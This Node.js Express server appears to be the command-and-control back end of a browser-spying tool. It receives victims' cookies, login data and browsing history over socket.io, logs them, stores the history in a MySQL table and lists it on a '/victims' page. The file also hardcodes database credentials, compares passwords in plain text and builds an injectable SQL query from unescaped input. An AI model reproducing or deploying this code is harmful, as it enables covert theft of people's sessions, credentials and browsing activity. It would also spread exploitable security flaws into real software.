var express = require('express');
var passport = require('passport');
var Strategy = require('passport-local').Strategy;
var users = require('./db/users');
var app = express();
var server = require('http').Server(app);
var io = require('socket.io')(server);
var mysql = require('mysql');

var con = mysql.createConnection({
  host: "mysql4.cs.stonybrook.edu",
  user: "kevchang",
  password: "110328939",
  database: "kevchang"
});

con.connect(function(err) {
  if (err) throw err;
  console.log("Connected To Database!");
});

passport.use(new Strategy(
  function(username, password, cb) {
    users.findByUsername(username, function(err, user) {
      if (err) { return cb(err); }
      if (!user) { return cb(null, false); }
      if (user.password != password) { return cb(null, false); }
      return cb(null, user);
    });
  }));

passport.serializeUser(function(user, cb) {
  cb(null, user.id);
});

passport.deserializeUser(function(id, cb) {
  users.findById(id, function (err, user) {
    if (err) { return cb(err); }
    cb(null, user);
  });
});




// Create a new Express application.


// Configure view engine to render EJS templates.
app.set('views', __dirname + '/views');
app.set('view engine', 'ejs');

// Use application-level middleware for common functionality, including
// logging, parsing, and session handling.
//app.use(require('morgan')('combined'));
app.use(require('cookie-parser')());
app.use(require('body-parser').urlencoded({ extended: true }));
app.use(require('express-session')({ secret: 'idkThisIsMySecretToSignCookie', resave: false, saveUninitialized: false }));

// Initialize Passport and restore authentication state, if any, from the
// session.
app.use(passport.initialize());
app.use(passport.session());

// Define routes.
app.get('/',
  function(req, res) {
    res.render('home', { user: req.user });
  });

app.get('/login',
  function(req, res){
    res.render('login');
  });

app.post('/login',
  passport.authenticate('local', { failureRedirect: '/login' }),
  function(req, res) {
    res.redirect('/');
  });

app.get('/logout',
  function(req, res){
    req.logout();
    res.redirect('/');
  });

app.get('/victims',
  require('connect-ensure-login').ensureLoggedIn(),
  function(req, res){
    con.query("SELECT * FROM History", function (err, result, fields) {
      if (err) throw err;
      res.render('victims', { user: req.user, rowData: result });
    });

  });

app.get('/profile',
  require('connect-ensure-login').ensureLoggedIn(),
  function(req, res){
    res.render('profile', { user: req.user });
  });


server.listen(3000);
console.log("Listening on port 3000");

io.on('connection', (socket) => {
  socket.on("userInfo", (userInfo) => {
    console.log("User connected: " + userInfo.email + " " + userInfo.id);
  });
  socket.emit('securityWebsites', [
    "www.google.com",
    "www.youtube.com"
  ]);
  socket.on('Login', (loginInfo) => {
    console.log("Login detected: " + loginInfo);
  });
  socket.on('Cookies', (cookies) => {
    console.log("Cookies");
    cookies.split(' ').forEach((cookie) => {
      console.log("    " + cookie);
    });
  });
  socket.on('History', (history) => {
    var str1 = "'"+history[0]+"'" //siteLink String
    var str2 = "'"+history[1]+"'" //timeStamp String

    //INSERT INTO kevchang.History (userID, Details) VALUES (1, "secondDetails");
    var sql = "INSERT INTO History (userID, timeDetails,siteLink) VALUES (1, "+ str2 + ","+ str1+")";

    con.query(sql, function (err, result) {
        if (err) throw err;
      console.log("1 record inserted");
    });
    //history.forEach((field) => {
      //console.log("Field: "+typeof(field));
      //
      //console.log("    " + field);
    //});
  });
  socket.on('disconnect', () => {
    console.log("User disconnected");
  });
});
